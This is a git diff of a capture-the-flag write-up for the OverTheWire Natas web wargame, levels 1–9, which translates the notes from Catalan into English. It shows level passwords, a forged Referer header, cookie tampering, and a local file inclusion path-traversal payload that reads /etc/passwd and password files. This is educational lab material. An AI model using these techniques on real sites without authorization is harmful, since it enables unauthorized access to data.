@@ -22,10 +22,11 @@ Password: g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
 URL:      http://natas1.natas.labs.overthewire.org
 ```
 ```
-NO ens deixa clickar botó dret per inspeccionar. Anem a:
+We can't right click on the site.
+So we have to go:
 view-source:http://natas1.natas.labs.overthewire.org/
 
-Dintre del body trobem:
+Inside HTML body:
 <!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 -->
 ```
 ## NATAS 2
@@ -35,9 +36,10 @@ Password: h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
 URL:      http://natas2.natas.labs.overthewire.org
 ```
 ```
-Escanejant el 'source code' trobem que hi ha una imatge que es diu 'pixel.png' en el directori /files.
-Si ens dirigim al directori /files, trobem 2 fitxers (pixel.png i users.txt)
-Contingut users.txt:
+Inspecting 'source code' we can find an image named "pixel.png" on /files.
+If we go to /files directory we found 2 files 'pixel.png' & 'users.txt'
+
+Content users.txt:
 # username:password
 alice:BYNdCesZqW
 bob:jw2ueICLvT
@@ -45,8 +47,6 @@ charlie:G5vCxkVV3m
 natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
 eve:zo4mJWyNj2
 mallory:9urtcpzBmH
-
-Podem veure l'users.txt dintre el directori ja que ens deixa indexar tot el que estigui dintre d'aquest directori. Per tant, tot el que estigui dintre /files, és públic. Podem fer 'fuzzing'.
 ```
 ## NATAS 3
 ``` 
@@ -55,22 +55,22 @@ Password: G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
 URL:      http://natas3.natas.labs.overthewire.org
 ```
 ```
-Inspeccionant el 'source code', trobem una frase un tant curiosa:
+Inspecting the 'source code' we find a curious text:
 <!-- No more information leaks!! Not even Google will find it this time... -->
 
-Si Google no ho pot indexar, és perquè el fitxer 'robots.txt' ens ho esta capant. Utilitzant robots.txt, no podrem fer-li OSINT a la pàgina web. 
-Sapiguent això, ens dirigim a l'URL:
+If Google can't find it it's because Google can't index it.
+There is a file called 'robots.txt' that is disabling this.
+Inspecting file:
 http://natas3.natas.labs.overthewire.org/robots.txt
 
-El contingut del fitxer 'robots.txt' és:
+Content of 'robots.txt':
 User-agent: *
 Disallow: /s3cr3t/
 
-Ens dirigim a: http://natas3.natas.labs.overthewire.org/s3cr3t/
-Trobem el fitxer 'users.txt'. Contingut:
+Now we go to the URL:
+http://natas3.natas.labs.overthewire.org/s3cr3t/
+We found 'users.txt':
 natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
-
-Han tornat a liarla com el NATAS2, ja que no hauriem de ser capaços de veure el fitxer 'users.txt'.
 ```
 ## NATAS 4
 ```
@@ -79,17 +79,34 @@ Password: tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
 URL:      http://natas4.natas.labs.overthewire.org
 ```
 ```
-Escanejant el 'source code' trobem aquest text:
+Viewing the 'source code' we find:
 Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
 
-Trobem el fitxer 'index.php', que realment és un botó de "Refresh page".
-Com que sabem que hem de venir de la URL que ens diuen, hem de "falsificar" la URL d'origen, és a dir, l'HTTP header 'referer'.
+We find the file 'index.php' that in reality is a button like "refresh page"
+We have to fake the HTTP header 'referer'.
 
-Amb el BurpSuite podem veure aquests headers i amb el Repeater, analitzem la pàgina web i veiem el referer:
-Referer: http://natas4.natas.labs.overthewire.org/
+We are moving to the BurpSuite.
+Now we are capturing the request.
+Send it to the Repeater. With that we are able to see the HTTP headers.
 
-Canviem aquesta URL per natas5 i trobem la password.
-Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
+We have to add:
+    Referer: http://natas5.natas.labs.overthewire.org/
+Final Headers:
+    GET / HTTP/1.1
+    Host: natas4.natas.labs.overthewire.org
+    Cache-Control: max-age=0
+    Authorization: Basic bmF0YXM0OnRLT2NKSWJ6TTRsVHM4aGJDbXpuNVpyNDQzNGZHWlFt
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: en-US,en;q=0.9
+    Referer: http://natas5.natas.labs.overthewire.org/
+    Connection: close
+
+Response:
+    HTTP/1.1 200 OK
+    Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
 ```
 ## NATAS 5
 ```
@@ -98,13 +115,13 @@ Password: Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
 URL:      http://natas5.natas.labs.overthewire.org
 ```
 ```
-A la pàgina web, de moment trobem aquest text:
-Access disallowed. You are not logged in
+On the site we see:
+    Access disallowed. You are not logged in
 
-Escanejant amb el Burpsuite, trobem un camp que és:
-Cookie: loggedin=0.
-Suposem que 0=false, si posem un 1(=true), podem veure la password.
-Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
+Scanning with Burpsuite we find an interesting field:
+    Cookie: loggedin=0.
+We assume that 0=false. If we put 1 (true) we can see the password:
+    Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
 ```
 ## NATAS 6
 ```
@@ -113,10 +130,10 @@ Password: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
 URL:      http://natas6.natas.labs.overthewire.org
 ```
 ```
-Trobem que hi ha un formulari amb "method=post".
-Ens diu: Input Secret.
-També hi ha un enllaç d'un fitxer "index-source.html".
-Aquest fitxer té un contingut PHP:
+We find a form with POST method.
+It tells us: Input Secret.
+There is a link that redirects us to see the content of the file "index-source.html".
+Content:
 <?
 include "includes/secret.inc";
 
@@ -130,19 +147,16 @@ include "includes/secret.inc";
 ?>
 ```
 ```
-Ens dirigim a:
+We move to:
 http://natas6.natas.labs.overthewire.org/includes/secret.inc
 
-I obtenim:
-<?
-$secret = "FOEIUWGHFEEUHOFUOIU";
-?>
+And we get:
+    <?
+    $secret = "FOEIUWGHFEEUHOFUOIU";
+    ?>
 
-Si en el formulari li posem aquesta secret, obtenim la password de natas7:
-Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
-
-Han passat el check de quan anem a /includes, no ens mostra cap fitxer, és més, ens surt FORBIDDEN. Per tant, han tret l'indexador.
-Però l'han liat en què la password és en text clar i a més, que qualsevol usuari pot accedir-hi. Hauria d'accedir-s'hi nomès des del server (secret definit de forma Global).
+If we put these 'secret' on the form:
+    Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
 ```
 ## NATAS 7
 ```
@@ -151,48 +165,48 @@ Password: jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
 URL:      http://natas7.natas.labs.overthewire.org
 ```
 ```
-Veiem dos links: un "HOME" i un "ABOUT".
-Si cliquem sobre el Home, no ens mostra res en concret, però a la URL hi veiem:
-http://natas7.natas.labs.overthewire.org/index.php?page=home
-És a dir, una variable "page" dintre del fitxer "index.php".
-El primer que se m'ha acudit és un path traversal, he provat:
-https://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../../../etc/passwd
+WE find two links: "HOME" & "ABOUT".
+By clicking on the 'Home' link our URL is:
+    http://natas7.natas.labs.overthewire.org/index.php?page=home
 
-Ens mostra el fitxer. Per tant, és vulnerable.
+WE try to do a LFI (Local File Inclusion)
+    https://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../../../etc/passwd
 
-Sabem que les passwords s'emmagatzemen a:
-/etc/natas_webpass/natasX.
-Per tant, fem:
-http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 i ens mostra la password.
+We can see the file.
+
+We know that the passwords of the natas games are stored in /etc/natas_webpass/natasX file.
+Just we try to do a LFI on that file.
+    http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
 ```
 ## NATAS 8
 ```
 Username: natas8
 Password: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
 URL:      http://natas8.natas.labs.overthewire.org
+```
+```
+By clicking on 'view sourcecode' we find PHP code:
+    <?
+    $encodedSecret = "3d3d516343746d4d6d6c315669563362";
 
-Clicant sobre "view sourcecode" trobem un tros de PHP:
-<?
-$encodedSecret = "3d3d516343746d4d6d6c315669563362";
-
-function encodeSecret($secret) {
-    return bin2hex(strrev(base64_encode($secret)));
-}
-if(array_key_exists("submit", $_POST)) {
-    if(encodeSecret($_POST['secret']) == $encodedSecret) {
-    print "Access granted. The password for natas9 is <censored>";
-    } else {
-    print "Wrong secret";
+    function encodeSecret($secret) {
+        return bin2hex(strrev(base64_encode($secret)));
     }
-}
-?>
+    if(array_key_exists("submit", $_POST)) {
+        if(encodeSecret($_POST['secret']) == $encodedSecret) {
+        print "Access granted. The password for natas9 is <censored>";
+        } else {
+        print "Wrong secret";
+        }
+    }
+    ?>
 ```
 ```
-El code ens mostra que la $encodedSecret es fa convertint el text en base64, desprès li fa un 'string reverse' i finalment converteix converteix el binari en hexadecimal.
-Per tenir la $decodedSecret hem de fer el contrari. Un hex2bin, un reverse i un base64 decode.
-És a dir, el 'contrari' del coded.
+Reading that code we know that the $encodedSecret is made by converting the default text in base64. After this it makes an "string reverse" and finally it converts the binary text to hex.
+So we to have the $decodedSecret we have to do the same steps but backwards.
+To get the $decodedSecret we have to do the reverse. First an hex2bin, then a reverse and finally a base64 decode.
 
-Ho fem:
+Script to do so:
 <?php
 function decodeSecret($secret) {
     return base64_decode(strrev(hex2bin($secret)));
@@ -200,10 +214,10 @@ function decodeSecret($secret) {
 echo decodeSecret("3d3d516343746d4d6d6c315669563362");
 ?>
 
-Ens dona: oubWYf2kBq
+Output: oubWYf2kBq
 
-Si ho posem al formulari de la nostra pàgina web, ens dona la password:
-Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
+If we put it to the form we can get the password:
+    Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
 ```
 ## NATAS 9
 ```
